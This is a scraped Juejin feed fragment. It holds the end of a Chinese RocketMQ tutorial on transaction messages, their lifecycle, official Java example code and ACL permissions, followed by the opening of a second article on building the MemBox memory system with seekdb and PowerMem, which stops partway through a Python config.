<p>简单的描述以上内容（后续会有文章来单独介绍，具体内容请看原文：<a href="https://link.juejin.cn?target=https%3A%2F%2Frocketmq.apache.org%2Fzh%2Fdocs%2FfeatureBehavior%2F04transactionmessage%2F%3Ff_link_type%3Df_linkinlinenote%26flow_extra%3DeyJpbmxpbmVfZGlzcGxheV9wb3NpdGlvbiI6MCwiZG9jX3Bvc2l0aW9uIjowLCJkb2NfaWQiOiI0OTViMWYyMzhjNTQ3NzQwLTYwYTNhMTQ0MDNlMTA1YjUifQ%253D%253D" target="_blank" title="https://rocketmq.apache.org/zh/docs/featureBehavior/04transactionmessage/?f_link_type=f_linkinlinenote&amp;flow_extra=eyJpbmxpbmVfZGlzcGxheV9wb3NpdGlvbiI6MCwiZG9jX3Bvc2l0aW9uIjowLCJkb2NfaWQiOiI0OTViMWYyMzhjNTQ3NzQwLTYwYTNhMTQ0MDNlMTA1YjUifQ%3D%3D" ref="nofollow noopener noreferrer">事务消息 | RocketMQ</a>）</p>
<p><strong>首先</strong>，生产者将消息发送至Apache RocketMQ服务端，实际上是向 Broker（Server）发送一条 “半消息”（Half Message），Broker 确认接收成功后，这条消息暂时不会投递给消费者。<strong>然后</strong>生产者开始执行本地业务事务（比如数据库操作），确保业务逻辑和消息发送的一致性。<strong>接着</strong>本地事务执行完成后，生产者向 Broker 发送 Commit（事务成功）或 Rollback（事务失败）指令，告知 Broker 最终处理结果。事务状态回查有补偿机制，如果 Broker 长时间未收到生产者的指令，会主动触发事务回查，向生产者询问本地事务的最终状态；生产者重新检查本地事务并反馈结果。<strong>最后</strong> Broker 收到 Commit 指令时，会将半消息正式投递给消费者（Subscriber）；收到 Rollback 指令时，则直接丢弃半消息，不进行投递。</p>
</blockquote>
<h4 data-id="heading-30">8.2 生命周期</h4>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/95a4613d1ba6427ba226dca41bee43a9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCS5pS-5ZCn5b635b63:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769523170&amp;x-signature=pS%2BjqErIaer6goD3KOZxKMUKN3Q%3D" alt="" loading="lazy"/></p>
<ul>
<li>初始化：半事务消息被生产者构建并完成初始化，待发送到服务端的状态。</li>
<li>事务待提交：半事务消息被发送到服务端，和普通消息不同，并不会直接被服务端持久化，而是会被单独存储到事务存储系统中，等待第二阶段本地事务返回执行结果后再提交。此时消息对下游消费者不可见。</li>
<li>消息回滚：第二阶段如果事务执行结果明确为回滚，服务端会将半事务消息回滚，该事务消息流程终止。</li>
<li>提交待消费：第二阶段如果事务执行结果明确为提交，服务端会将半事务消息重新存储到普通存储系统中，此时消息对下游消费者可见，等待被消费者获取并消费。</li>
<li>消费中：消息被消费者获取，并按照消费者本地的业务逻辑进行处理的过程。 此时服务端会等待消费者完成消费并提交消费结果，如果一定时间后没有收到消费者的响应，Apache RocketMQ会对消息进行重试处理。具体信息。</li>
<li>消费提交：消费者完成消费处理，并向服务端提交消费结果，服务端标记当前消息已经被处理（包括消费成功和失败）。 Apache RocketMQ默认支持保留所有消息，此时消息数据并不会立即被删除，只是逻辑标记已消费。消息在保存时间到期或存储空间不足被删除前，消费者仍然可以回溯消息重新消费。</li>
<li>消息删除：Apache RocketMQ按照消息保存机制滚动清理最早的消息数据，将消息从物理文件中删除。</li>
</ul>
<h4 data-id="heading-31">8.3 官方实例代码</h4>
<p>① 实现 TransactionListener 接口</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransactionListenerImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">TransactionListener</span> {
    <span class="hljs-comment">// 原子整型：生成自增数值，模拟不同的本地事务结果（线程安全，适配多线程发送场景）</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">transactionIndex</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);
    <span class="hljs-comment">// 并发哈希表：存储「事务消息ID-事务状态」的映射，供回查时使用（线程安全）</span>
    <span class="hljs-keyword">private</span> ConcurrentHashMap&lt;String, Integer&gt; localTrans = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();

    <span class="hljs-comment">// 执行本地事务</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> LocalTransactionState <span class="hljs-title function_">executeLocalTransaction</span><span class="hljs-params">(Message msg, Object arg)</span> {
        <span class="hljs-type">int</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> transactionIndex.getAndIncrement();
        <span class="hljs-type">int</span> <span class="hljs-variable">status</span> <span class="hljs-operator">=</span> value % <span class="hljs-number">3</span>;
        localTrans.put(msg.getTransactionId(), status);
        <span class="hljs-keyword">return</span> LocalTransactionState.UNKNOW;
    }

    <span class="hljs-comment">// 回查事务状态</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> LocalTransactionState <span class="hljs-title function_">checkLocalTransaction</span><span class="hljs-params">(MessageExt msg)</span> {
        <span class="hljs-type">Integer</span> <span class="hljs-variable">status</span> <span class="hljs-operator">=</span> localTrans.get(msg.getTransactionId());
        <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != status) {
            <span class="hljs-keyword">switch</span> (status) {
                <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:
                    <span class="hljs-keyword">return</span> LocalTransactionState.UNKNOW;
                <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:
                    <span class="hljs-keyword">return</span> LocalTransactionState.COMMIT_MESSAGE;
                <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:
                    <span class="hljs-keyword">return</span> LocalTransactionState.ROLLBACK_MESSAGE;
                <span class="hljs-keyword">default</span>:
                    <span class="hljs-keyword">return</span> LocalTransactionState.COMMIT_MESSAGE;
            }
        }
        <span class="hljs-keyword">return</span> LocalTransactionState.COMMIT_MESSAGE;
    }
}
</code></pre>
<p>② 生产者</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransactionProducer</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">PRODUCER_GROUP</span> <span class="hljs-operator">=</span> <span class="hljs-string">"please_rename_unique_group_name"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_NAMESRVADDR</span> <span class="hljs-operator">=</span> <span class="hljs-string">"127.0.0.1:9876"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TOPIC</span> <span class="hljs-operator">=</span> <span class="hljs-string">"TopicTest1234"</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">MESSAGE_COUNT</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MQClientException, InterruptedException {
        <span class="hljs-type">TransactionListener</span> <span class="hljs-variable">transactionListener</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransactionListenerImpl</span>();
        <span class="hljs-type">TransactionMQProducer</span> <span class="hljs-variable">producer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransactionMQProducer</span>(PRODUCER_GROUP);

        producer.setNamesrvAddr(DEFAULT_NAMESRVADDR);
        <span class="hljs-type">ExecutorService</span> <span class="hljs-variable">executorService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(<span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">100</span>, TimeUnit.SECONDS, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBlockingQueue</span>&lt;&gt;(<span class="hljs-number">2000</span>), r -&gt; {
            <span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r);
            thread.setName(<span class="hljs-string">"client-transaction-msg-check-thread"</span>);
            <span class="hljs-keyword">return</span> thread;
        });

        producer.setExecutorService(executorService);
        producer.setTransactionListener(transactionListener);
        producer.start();

        String[] tags = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] {<span class="hljs-string">"TagA"</span>, <span class="hljs-string">"TagB"</span>, <span class="hljs-string">"TagC"</span>, <span class="hljs-string">"TagD"</span>, <span class="hljs-string">"TagE"</span>};
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; MESSAGE_COUNT; i++) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-type">Message</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span>
                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Message</span>(TOPIC, tags[i % tags.length], <span class="hljs-string">"KEY"</span> + i,
                        (<span class="hljs-string">"Hello RocketMQ "</span> + i).getBytes(RemotingHelper.DEFAULT_CHARSET));
                <span class="hljs-type">SendResult</span> <span class="hljs-variable">sendResult</span> <span class="hljs-operator">=</span> producer.sendMessageInTransaction(msg, <span class="hljs-literal">null</span>);
                System.out.printf(<span class="hljs-string">"%s%n"</span>, sendResult);

                Thread.sleep(<span class="hljs-number">10</span>);
            } <span class="hljs-keyword">catch</span> (MQClientException | UnsupportedEncodingException e) {
                e.printStackTrace();
            }
        }

        <span class="hljs-comment">// 保持程序运行（关键！否则生产者关闭后无法接收回查回调）</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100000</span>; i++) {
            Thread.sleep(<span class="hljs-number">1000</span>);
        }
        producer.shutdown();
    }
}
</code></pre>
<p>这两段代码，其中 <code>TransactionListenerImpl</code> 是事务监听器的实现类（负责处理本地事务和事务回查），<code>TransactionProducer</code> 是事务消息生产者（负责发送事务消息并驱动整个流程）。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">LocalTransactionState</span> {
    COMMIT_MESSAGE, <span class="hljs-comment">// “提交”，消息对消费者可见；</span>
    ROLLBACK_MESSAGE, <span class="hljs-comment">// “回滚”，消息被丢弃；</span>
    UNKNOW; <span class="hljs-comment">//  “未知”，RocketMQ 会继续回查（直到超时）；</span>
}
</code></pre>
<p>当 <code>executeLocalTransaction</code> 返回 <code>UNKNOW</code>，或生产者与 <code>RocketMQ</code> 通信异常时，<code>RocketMQ</code>会定时回调该方法，确认本地事务最终状态；</p>
<p>必须使用 <code>TransactionMQProducer</code>来发送消息。</p>
<h3 data-id="heading-32">9 ACL 权限控制机制</h3>
<p>访问控制 2.0（ACL 2.0）是Apache RocketMQ的访问控制列表(Access Control List)升级版本，提供了完善的身份认证(Authentication)和权限授权(Authorization)机制，用于保护RocketMQ集群的数据安全。</p>
<p>我们可以在控制界面给 topic 设置权限</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/366e84d27fff4c1fb7ca6ccd56d2bf74~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCS5pS-5ZCn5b635b63:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769523170&amp;x-signature=WFe8OwyXH6tJdcwCbyyZQnd6Lxo%3D" alt="" loading="lazy"/></p>
<p>如图中的 perm 表示 topic 的权限，有三个可选项。 2：禁写禁订阅，4：可订阅，不能写，6：可写可订阅。</p>
<blockquote>
<p>在Broker端还提供了更详细的权限控制机制。主要是在broker.conf中打开acl的标志：aclEnable=true。就可以用plain_acl.yml来进⾏权限配置了，并且是热加载，无需重启。</p>
<p><strong>但是我这个是 2.0，在 ACL2.0 这种方法已经被移除了（后续文章将详细描写）。</strong></p>
</blockquote>
<p>ACL 2.0 可以通过配置 broker.conf 来设置认证授权等。</p>
<h3 data-id="heading-33">总结</h3>
<p>RocketMQ 客户端消息机制具备清晰的使用逻辑与完善的可靠性保障：生产者、消费者均有固定编程步骤；消息确认机制分生产端（同步 / 异步 / 单向发送的差异化确认，关联 Broker 刷盘 / 复制策略）和消费端（基于 Offset 的自动 / 手动确认，含重试、死信队列等兜底）；消费模式支持集群（负载均衡，Broker 管理 Offset）与广播（全量消费，本地维护 Offset）；消息过滤可通过 Tag（简单高效）或 SQL92（复杂灵活）在 Broker 端实现，减少无效传输。</p>
<hr/>
<p><em>转发请携带作者信息</em>  <strong>@怒放吧德德 @一个有梦有戏的人</strong><br/>
持续创作很不容易，作者将以尽可能的详细把所学知识分享各位开发者，一起进步一起学习。<strong>转载请携带链接，转载到微信公众号请勿选择原创，谢谢！</strong><br/>
👍创作不易，如有错误请指正，感谢观看！记得点赞哦！👍<br/>
谢谢支持！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[使用 seekdb + PowerMem 构建多模态智能记忆系统 MemBox]]></title>    <link>https://juejin.cn/post/7597243334177456168</link>    <guid>https://juejin.cn/post/7597243334177456168</guid>    <pubDate>2026-01-20T14:16:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597243334177456168" data-draft-id="7597326073671483407" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="使用 seekdb + PowerMem 构建多模态智能记忆系统 MemBox"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2026-01-20T14:16:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Se7en258"/> <meta itemprop="url" content="https://juejin.cn/user/1028798616450734"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            使用 seekdb + PowerMem 构建多模态智能记忆系统 MemBox
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1028798616450734/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Se7en258
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T14:16:00.000Z" title="Tue Jan 20 2026 14:16:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读14分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在与 AI 应用交互时，你有没有经历过这样的场景：每次新会话都要重新介绍自己是谁、在做什么项目，刚才聊过的偏好转眼就被忘得一干二净？这是因为大多数大语言模型本质上是<strong>无状态</strong>的——每一次对话都是从零开始，上下文窗口有限且无法持久化。</p>
<p>如果能让 AI "记住"用户——不仅记住当前对话，还能记住历史交互、个人偏好和用户画像——它就能成为真正有"成长性"的智能助手。本文将介绍如何使用 OceanBase 推出的 <strong>SeekDB</strong>（AI 原生混合搜索数据库）和 <strong>PowerMem</strong>（智能记忆管理库）构建一个多模态智能记忆系统 MemBox，实现用户记忆持久化、语义检索和个性化回复，让 AI 拥有跨会话的"长期记忆"。</p>
<h2 data-id="heading-0">1. SeekDB 介绍</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Foceanbase%2Fseekdb" target="_blank" title="https://github.com/oceanbase/seekdb" ref="nofollow noopener noreferrer">seekdb</a> 是 OceanBase 推出的 AI 原生混合搜索数据库，在一个数据库中融合向量、文本、结构化与半结构化数据能力，并通过内置 AI Functions 支持多模混合搜索与智能推理。</p>
<p>SeekDB 的核心特性：</p>
<ul>
<li><strong>灵活部署</strong>：支持嵌入式和服务器两种部署模式。嵌入式模式下可将 seekdb 直接集成进 Python 应用，便于进行个人开发。</li>
<li><strong>混合搜索</strong>：向量、全文与标量过滤在一次查询中完成，支持粗排 + 精排的多阶段搜索链路。</li>
<li><strong>多模数据与索引</strong>：支持向量、文本、JSON、GIS 等多模数据，提供 HNSW/IVF 向量索引、BM25 全文索引等。</li>
<li><strong>AI 内置</strong>：在数据库内完成向量嵌入、推理、提示词管理与重排，支持 document-in/data-out 的完整 RAG 流程。</li>
<li><strong>SQL 原生</strong>：源于成熟的 OceanBase 引擎，支持实时写入、实时可查，ACID 事务保证，兼容 MySQL 生态。</li>
<li><strong>统一应用接口</strong>：适配 LangChain、LlamaIndex、Dify 等近 30 种 AI 框架，提供 MCP Server。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2d3372e88e3944c5a6b23c2ec8ca74ce~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2U3ZW4yNTg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769523361&amp;x-signature=V%2B9K4%2BexQnejUiI%2BfvaI5xxA7E4%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">2. PowerMem 介绍</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Foceanbase%2Fpowermem" target="_blank" title="https://github.com/oceanbase/powermem" ref="nofollow noopener noreferrer">PowerMem</a> 是一个智能记忆管理库。在 AI 应用开发中，如何让大语言模型持久化地"记住"历史对话、用户偏好和上下文信息是一个核心挑战。PowerMem 融合向量检索、全文检索和图数据库的混合存储架构，为 AI 应用构建了强大的记忆基础设施。</p>
<p>PowerMem 的核心特性：</p>
<ul>
<li><strong>轻量级接入</strong>：提供简洁的 Python SDK，还支持 MCP Server 和 HTTP API Server 接入。</li>
<li><strong>智能记忆提取</strong>：通过 LLM 自动从对话中提取关键事实，智能检测重复、更新冲突信息并合并相关记忆。</li>
<li><strong>用户画像</strong>：自动构建和更新用户画像，让 AI 更好地理解每个用户。</li>
<li><strong>多用户/多智能体隔离</strong>：为每个用户或智能体提供独立的记忆空间，支持跨智能体协作。</li>
<li><strong>多模态支持</strong>：支持文本、图像、语音等多模态内容的记忆和检索。</li>
<li><strong>混合检索</strong>：融合向量检索、全文搜索和图检索的多路召回能力。</li>
</ul>
<h2 data-id="heading-2">3. 项目效果预览</h2>
<p>本文将带你使用 <strong>seekdb</strong> + <strong>PowerMem</strong> 从零构建一个多模态智能记忆系统 MemBox。MemBox 可以自动从对话中提取关键信息、构建用户画像、理解图片内容，并在后续对话中智能检索相关记忆，提供个性化回答。先来看看最终效果：</p>
<p/>
<h2 data-id="heading-3">4. 准备工作</h2>
<h3 data-id="heading-4">4.1 环境要求</h3>
<ul>
<li>Docker 和 Docker Compose（运行 seekdb）</li>
<li>Node.js 20+（前端）</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fpnpm.io%2F" target="_blank" title="https://pnpm.io/" ref="nofollow noopener noreferrer">pnpm</a>（前端包管理）</li>
<li>Python 3.11+（后端）</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.astral.sh%2Fuv%2F" target="_blank" title="https://docs.astral.sh/uv/" ref="nofollow noopener noreferrer">uv</a>（Python 包管理）</li>
</ul>
<h3 data-id="heading-5">4.2 获取 API Key</h3>
<p>本项目使用阿里云通义千问模型，需要获取阿里云百炼的 API Key：</p>
<ol>
<li>访问<a href="https://link.juejin.cn?target=https%3A%2F%2Fbailian.console.aliyun.com%2Fcn-beijing%2F%3FapiKey%3D1%23%2Fapi-key" target="_blank" title="https://bailian.console.aliyun.com/cn-beijing/?apiKey=1#/api-key" ref="nofollow noopener noreferrer">阿里云百炼控制台</a>。</li>
<li>开通服务并创建 API Key。</li>
</ol>
<h3 data-id="heading-6">4.3 启动 SeekDB</h3>
<p>使用 Docker 快速启动 seekdb：</p>
<pre><code class="hljs language-bash" lang="bash">docker run -d \
  --name seekdb \
  -p 2881:2881 \
  -v seekdb_data:/var/lib/oceanbase \
  oceanbase/seekdb:1.0.1.0-100000392025122619
</code></pre>
<h3 data-id="heading-7">4.4 环境变量设置</h3>
<p>本项目需要配置环境变量，可参考 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcr7258%2Fmembox%2Fblob%2Fmain%2F.env.example" target="_blank" title="https://github.com/cr7258/membox/blob/main/.env.example" ref="nofollow noopener noreferrer">.env.example</a> 文件，将其复制为 <code>.env</code> 并填入相应值。其中只需配置 <code>DASHSCOPE_API_KEY</code> 用于调用千问大模型，其他变量可保持默认。</p>
<h2 data-id="heading-8">5. 整体架构</h2>
<p>当用户与 MemBox 对话时，完整的请求流程如下：</p>
<ol>
<li><strong>用户输入</strong>：用户在前端发送消息（可包含文字和图片）。</li>
<li><strong>记忆检索</strong>：前端调用后端搜索相关记忆。</li>
<li><strong>向量搜索</strong>：后端使用 PowerMem 将查询通过 text-embedding-v4 模型转换为向量，在 seekdb 中进行相似度搜索。</li>
<li><strong>返回结果</strong>：seekdb 返回相关记忆和用户画像。</li>
<li><strong>上下文注入</strong>：前端将记忆上下文注入 LLM 的 System Prompt。</li>
<li><strong>生成回答</strong>：前端调用 qwen-plus 模型生成回答，如有图片则使用多模态模型 qwen-vl-plus 模型理解图片内容。</li>
<li><strong>返回响应</strong>：LLM 将回答返回给用户。</li>
<li><strong>记忆存储</strong>：对话结束后，PowerMem 提取新的事实信息，通过 text-embedding-v4 向量化后存入 seekdb。</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/42eee5b732d74a14a4ecae6ef8d66c48~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2U3ZW4yNTg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769523361&amp;x-signature=Fsx5cMijoiFIEUF5lF4fFbPNwNw%3D" alt="" loading="lazy"/></p>
<p>本文的完整代码可以在 Github 上找到：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcr7258%2Fmembox" target="_blank" title="https://github.com/cr7258/membox" ref="nofollow noopener noreferrer">github.com/cr7258/memb…</a></p>
<h2 data-id="heading-9">6. 搭建后端（FastAPI + PowerMem）</h2>
<h3 data-id="heading-10">6.1 配置 PowerMem</h3>
<p>PowerMem 支持两种配置方式：</p>
<ol>
<li><strong>环境变量（<code>.env</code> 文件）</strong>：适合大多数场景，PowerMem 会自动加载。</li>
<li><strong>JSON/ Python 字典配置</strong>：适合在代码中灵活管理配置的场景。</li>
</ol>
<p>本项目使用 JSON/Python 字典配置方式，<code>config.py</code> 配置如下：</p>
<pre><code class="hljs language-python" lang="python">config = {
    <span class="hljs-comment"># LLM 配置 - 用于智能记忆提取和用户画像</span>
    <span class="hljs-string">"llm"</span>: {
        <span class="hljs-string">"provider"</span>: <span class="hljs-string">"qwen"</span>,
        <span class="hljs-string">"config"</span>: {
            <span class="hljs-string">"model"</span>: os.getenv(<span class="hljs-string">"LLM_MODEL"</span>, <span class="hljs-string">"qwen-plus"</span>),
            <span class="hljs-string">"api_key"</span>: os.getenv(<span class="hljs-string">"DASHSCOPE_API_KEY"</span>),
        }
    },
    
    <span class="hljs-comment"># Embedding 配置 - 用于向量化</span>
    <span class="hljs-string">"embedder"</span>: {
        <span class="hljs-string">"provider"</span>: <span class="hljs-string">"qwen"</span>,
        <span class="hljs-string">"config"</span>: {
